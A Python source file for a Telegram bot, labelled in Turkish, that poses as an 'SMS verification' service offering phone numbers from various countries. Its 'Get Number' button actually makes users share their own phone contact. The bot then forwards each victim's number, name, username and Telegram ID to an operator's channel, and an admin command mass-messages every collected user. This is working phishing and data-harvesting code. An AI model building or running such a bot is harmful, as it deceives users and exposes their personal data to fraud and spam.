from telegram import (
    Update,
    KeyboardButton,
    ReplyKeyboardMarkup,
    Contact,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters
)
import random
from datetime import datetime
import pytz
import os

# ENV DEĞERLERİ
TOKEN = os.getenv("BOT_TOKEN")
KANAL_ID = os.getenv("KANAL_ID")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

TIMEZONE = pytz.timezone("Europe/Istanbul")

# KULLANICI VERİLERİ
kullanicilar = {}   # {user_id: {"username": "", "name": ""}}
kullanici_durum = {}

ulkeler = [
    ("Türkiye", "🇹🇷"), ("Almanya", "🇩🇪"), ("Fransa", "🇫🇷"),
    ("ABD", "🇺🇸"), ("İngiltere", "🇬🇧"), ("Kanada", "🇨🇦"),
    ("İtalya", "🇮🇹"), ("İspanya", "🇪🇸"), ("Hollanda", "🇳🇱"),
    ("Japonya", "🇯🇵"), ("Rusya", "🇷🇺"), ("Brezilya", "🇧🇷"),
    ("Avustralya", "🇦🇺"), ("Hindistan", "🇮🇳"), ("Çin", "🇨🇳"),
    ("Meksika", "🇲🇽"), ("İsveç", "🇸🇪"),
]

# --------------------------
# KULLANICI KAYDET
# --------------------------
def kullanici_kaydet(user):
    username = f"@{user.username}" if user.username else "Yok"
    name = user.first_name or "Bilinmiyor"

    kullanicilar[user.id] = {
        "username": username,
        "name": name
    }

# --------------------------
# START
# --------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    kullanici_kaydet(user)

    ad = user.username or user.first_name
    await update.message.reply_text(
        f"✨ Hoş geldin {ad}\nSMS doğrulama botu",
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("💬 SMS Onayla")]],
            resize_keyboard=True
        )
    )

# --------------------------
# SMS ONAYLA
# --------------------------
async def sms_onayla(update: Update, context: ContextTypes.DEFAULT_TYPE):
    secilen = random.sample(ulkeler, 15)
    butonlar = [[KeyboardButton(f"{b} {i}")] for i, b in secilen]
    butonlar.append([KeyboardButton("🔙 Geri Dön")])

    await update.message.reply_text(
        "Bir ülke seç:",
        reply_markup=ReplyKeyboardMarkup(butonlar, resize_keyboard=True)
    )

# --------------------------
# MESAJ HANDLER
# --------------------------
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    kullanici_kaydet(user)

    text = update.message.text
    uid = user.id

    if text == "💬 SMS Onayla":
        await sms_onayla(update, context)

    elif text == "🔙 Geri Dön":
        await start(update, context)

    elif any(text == f"{b} {i}" for i, b in ulkeler):
        kullanici_durum[uid] = True
        await update.message.reply_text(
            "BUTONA BASARAK NUMARA AL:",
            reply_markup=ReplyKeyboardMarkup(
                [[KeyboardButton("📱 Numara Al", request_contact=True)]],
                resize_keyboard=True
            )
        )

# --------------------------
# NUMARA GELDİĞİNDE
# --------------------------
async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    kullanici_kaydet(user)

    uid = user.id

    if not kullanici_durum.get(uid):
        return

    c: Contact = update.message.contact
    zaman = datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")

    info = kullanicilar.get(uid, {})
    username = info.get("username", "Yok")
    name = info.get("name", "Bilinmiyor")

    # Profil butonu
    buton = InlineKeyboardMarkup([
        [InlineKeyboardButton("👤 Profili Aç", url=f"tg://user?id={uid}")]
    ])

    await context.bot.send_message(
        chat_id=KANAL_ID,
        reply_markup=buton,
        text=(
            "☎️ NUMARA ALINDI\n\n"
            f"👤 İsim: {name}\n"
            f"🔗 Kullanıcı: {username}\n"
            f"🆔 ID: {uid}\n"
            f"📱 Numara: +{c.phone_number}\n"
            f"⏰ Saat: {zaman}"
        )
    )

    await update.message.reply_text("Alındı ✅")
    kullanici_durum[uid] = False

# --------------------------
# DUYURU (SADECE ADMIN)
# --------------------------
async def duyuru(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Bu komutu sadece admin kullanabilir.")
        return

    if not context.args:
        await update.message.reply_text("Kullanım: /duyuru mesajınız")
        return

    mesaj = " ".join(context.args)
    sayi = 0

    for uid in list(kullanicilar.keys()):
        try:
            await context.bot.send_message(chat_id=uid, text=mesaj)
            sayi += 1
        except:
            pass

    await update.message.reply_text(f"📢 Duyuru gönderildi ({sayi} kişiye).")

# --------------------------
# MAIN
# --------------------------
def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("duyuru", duyuru))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("Bot aktif...")
    app.run_polling()

if __name__ == "__main__":
    main()
